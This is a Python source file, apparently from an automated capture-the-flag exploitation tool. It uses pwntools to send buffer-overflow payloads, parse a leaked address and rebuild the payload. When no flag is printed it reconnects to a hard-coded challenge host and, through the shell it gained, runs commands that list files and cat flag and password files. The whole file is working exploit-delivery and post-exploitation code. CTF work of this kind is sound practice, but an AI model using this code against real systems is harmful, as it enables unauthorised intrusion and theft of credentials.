from pwn import remote, process, u64, u32
import re
from .overflowExploiter import exploitOverflow


def sendExploit(
    binary_name, properties, remote_server=False, remote_url="", port_num=0, user_input=None
):

    send_results = {}

    # Create local or remote process
    if remote_server:
        proc = remote(remote_url, port_num)
    else:
        proc = process(binary_name)

    # Command to send
    if user_input is None:
        user_input = properties["pwn_type"]["results"]["input"]

    if "leak_input" in properties["pwn_type"]["results"]:
        leak_input = properties["pwn_type"]["results"]["leak_input"]
        leak_output = properties["pwn_type"]["results"]["leak_output"]
        output_len = len(leak_output)
        input_len = len(leak_input)
        print(input_len)

        proc.send(leak_input)
        #bytes_before_leak = proc.read(output_len)
        bytes_with_leak = proc.read()
        print("--- Leak ---")
        print(bytes_with_leak)
        leak = re.search('0x[0-9|A-F|a-f]*',bytes_with_leak.decode('utf-8','ignore`')).group()
        print("leak is {}".format(leak))
        leak_val = int(leak,16)
        print("leak is {}".format(leak_val))
        # Since we're just looking at %p right now we can regex

        properties["pwn_type"]["run_leak"] = leak_val
        properties["pwn_type"]["results"] = exploitOverflow(binary_name, properties,inputType=properties["input_type"])

        # Trim user_input now that we have leak
        
        user_input = user_input[input_len:]

        # Send the rest of the exploit
        proc.send(user_input)
    else:
        proc.sendline(user_input)
    print(repr(user_input))

    # Sometimes the flag is just printed
    results = proc.recvall(timeout=3)

    send_results["flag_found"] = False
    if b"{" in results and b"}" in results:
        send_results["flag_found"] = True
        print("[+] Flag found:")
        print(results)
    # Flag not in stdout, we have a shell
    else:
        print("have shell maybe")
        if remote_server or True:
            proc = remote("0.cloud.chals.io", 28942)
        else:
            proc = process(binary_name)


        if "leak_input" in properties["pwn_type"]["results"]:
            leak_input = properties["pwn_type"]["results"]["leak_input"]
            leak_output = properties["pwn_type"]["results"]["leak_output"]
            output_len = len(leak_output)
            input_len = len(leak_input)
            print(input_len)

            proc.send(leak_input)
            bytes_before_leak = proc.read(output_len)
            bytes_with_leak = proc.read()
            print("--- Leak ---")
            print(bytes_with_leak)
            leak = re.search('0x[0-9|A-F|a-f]*',bytes_with_leak.decode('utf-8','ignore`')).group()
            print("leak is {}".format(leak))
            leak_val = int(leak,16)
            print("leak is {}".format(leak_val))
            # Since we're just looking at %p right now we can regex

            properties["pwn_type"]["run_leak"] = leak_val
            properties["pwn_type"]["results"] =     exploitOverflow(binary_name, properties,inputType=properties["input_type"])

            # Trim user_input now that we have leak
            user_input = user_input[input_len:]

            # Send the rest of the exploit
            proc.send(user_input)
        else:
            proc.sendline(user_input)

        print(proc.recv(timeout=3))

        proc.sendline()
        proc.sendline("ls;\n")
        proc.sendline("cat *flag*;\n")
        proc.sendline("cat *pass*;\n")
        command_results = proc.recvall(timeout=3)
        print(command_results)
        if b"{" in command_results and b"}" in command_results:
            send_results["flag_found"] = True
            print("[+] Flag found:")
            print(command_results)

    return send_results
